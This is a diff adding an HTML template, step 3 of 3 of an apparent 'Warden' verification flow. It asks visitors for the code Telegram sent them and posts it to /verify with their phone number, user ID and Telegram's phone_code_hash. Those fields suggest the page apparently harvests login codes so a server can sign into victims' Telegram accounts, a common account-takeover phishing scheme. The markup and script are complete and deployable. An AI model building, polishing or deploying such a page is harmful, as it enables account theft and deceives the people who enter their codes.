@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Warden — Step 3</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#04060e;--surface:rgba(255,255,255,0.03);--border:rgba(255,255,255,0.06);--text:#e2e8f0;--muted:#64748b;--green:#22c55e;--red:#ef4444}
+body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center}
+.grid-bg{position:fixed;inset:0;background-image:linear-gradient(rgba(34,197,94,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(34,197,94,0.03) 1px,transparent 1px);background-size:48px 48px;animation:gridMove 20s linear infinite}
+@keyframes gridMove{from{background-position:0 0}to{background-position:48px 48px}}
+.card{position:relative;z-index:1;background:var(--surface);border:1px solid var(--border);border-radius:24px;padding:48px 40px;max-width:440px;width:100%;backdrop-filter:blur(12px);animation:fadeUp .5s ease both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.step-label{font-family:'Space Mono',monospace;font-size:11px;letter-spacing:.1em;color:var(--green);margin-bottom:20px}
+h2{font-size:26px;font-weight:800;margin-bottom:8px;letter-spacing:-.02em}
+.sub{font-size:13px;color:var(--muted);margin-bottom:32px;line-height:1.5}
+.phone-display{font-family:'Space Mono',monospace;color:var(--green);font-size:13px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.15);border-radius:8px;padding:8px 14px;display:inline-block;margin-bottom:24px}
+label{display:block;font-size:12px;font-weight:700;letter-spacing:.05em;color:var(--muted);margin-bottom:6px;text-transform:uppercase}
+ 
+/* Big code input */
+.code-input{
+  width:100%;padding:20px 16px;
+  background:rgba(255,255,255,0.04);
+  border:1px solid var(--border);
+  border-radius:12px;color:var(--text);
+  font-family:'Space Mono',monospace;font-size:28px;
+  letter-spacing:.3em;text-align:center;
+  outline:none;transition:.2s;margin-bottom:16px;
+}
+.code-input:focus{border-color:var(--green);background:rgba(34,197,94,0.04)}
+.code-input::placeholder{color:rgba(100,116,139,0.4);letter-spacing:.1em;font-size:20px}
+ 
+.btn{width:100%;padding:16px;background:var(--green);color:#04060e;font-family:'Syne',sans-serif;font-size:15px;font-weight:700;border:none;border-radius:14px;cursor:pointer;transition:.2s}
+.btn:hover{background:#16a34a;transform:translateY(-1px)}
+.btn:disabled{background:#2d3748;color:var(--muted);cursor:not-allowed;transform:none}
+.error{color:var(--red);font-size:13px;margin-top:12px;display:none;padding:10px 14px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:10px}
+.info{margin-top:20px;font-size:12px;color:var(--muted);text-align:center}
+.timer{font-family:'Space Mono',monospace;color:var(--green)}
+.steps{display:flex;gap:8px;margin-bottom:32px}
+.step{flex:1;height:3px;border-radius:2px;background:var(--border)}
+.step.active{background:var(--green)}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="card">
+  <div class="steps">
+    <div class="step active"></div>
+    <div class="step active"></div>
+    <div class="step active"></div>
+  </div>
+  <div class="step-label">STEP 3 OF 3</div>
+  <h2>Verification Code</h2>
+  <p class="sub">A code was sent to your Telegram app.</p>
+  <div class="phone-display">{{ phone }}</div>
+ 
+  <form action="/verify" method="post" onsubmit="handleSubmit(event)">
+    <label>Enter Code</label>
+    <input class="code-input" id="code" name="code" placeholder="·····" type="text" inputmode="numeric" maxlength="6" required autocomplete="one-time-code">
+    <input type="hidden" name="phone" value="{{ phone }}">
+    <input type="hidden" name="user_id" value="{{ user_id }}">
+    <input type="hidden" name="phone_code_hash" value="{{ phone_code_hash }}">
+    <button type="submit" class="btn" id="submitBtn">Verify →</button>
+  </form>
+  <div class="error" id="errorMsg"></div>
+  <div class="info">Code expires in <span class="timer" id="timer">05:00</span></div>
+</div>
+ 
+<script>
+// Auto-format and submit on 5 digits
+const codeInput = document.getElementById('code');
+codeInput.addEventListener('input', function() {
+  this.value = this.value.replace(/\D/g, '');
+  if (this.value.length === 5) {
+    document.getElementById('submitBtn').focus();
+  }
+});
+ 
+function handleSubmit(e) {
+  const code = document.getElementById('code').value.trim();
+  const err  = document.getElementById('errorMsg');
+  err.style.display = 'none';
+ 
+  if (!code || code.length < 5) {
+    e.preventDefault();
+    err.textContent = 'Please enter the full 5-digit code.';
+    err.style.display = 'block';
+    return;
+  }
+  const btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+}
+ 
+// Countdown timer
+let seconds = 300;
+const timerEl = document.getElementById('timer');
+const interval = setInterval(() => {
+  seconds--;
+  if (seconds <= 0) {
+    clearInterval(interval);
+    timerEl.textContent = '00:00';
+    timerEl.style.color = '#ef4444';
+    return;
+  }
+  const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+  const s = String(seconds % 60).padStart(2, '0');
+  timerEl.textContent = `${m}:${s}`;
+}, 1000);
+</script>
+</body>
+</html>
+ 
